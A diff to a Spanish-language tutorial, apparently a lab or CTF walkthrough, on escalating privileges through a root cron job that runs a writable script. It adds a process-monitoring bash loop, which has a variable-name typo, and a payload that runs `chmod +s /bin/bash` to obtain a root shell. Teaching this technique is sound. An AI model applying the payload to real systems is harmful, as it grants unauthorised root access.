@@ -14,12 +14,26 @@ Como podemos identificar una tarea cron? con `ps -eo command` podemos vizualizar
 Para esto realizaremos un pequeño script.
 
 ``` bash
-
+ 1 #!/bin/bash
+ 2
+ 3 old_process=$(ps -eo command)
+ 4
+ 5
+ 6 while true; do
+ 7     new_process=$(ps -eo command)
+ 8     diff <(echo "$old_process") <(echo "$new_process") | grep  "[\>\<]" | grep -v "kworker"
+ 9     ol_process=$new_process
+10 done
 ```
 
 Una vez que ejecutemos nuestro script podemos vizualizar la tarea cron que hemos creado, ahora a explotar esta *recordar que el file.sh ejecutado tiene permisos e escritura asi que lo podemos modificar*.
 
 Como la tarea cron se esta ejecutando como root lo que vamos hacer es asignar permisos *suid* a la `/bin/bash`.
+``` bash
+ 1 #!/bin/bash
+ 2
+ 3 chmod +s /bin/bash
+```
 
 Ahora con un usuario no privilegiado abriremos una bash.
 
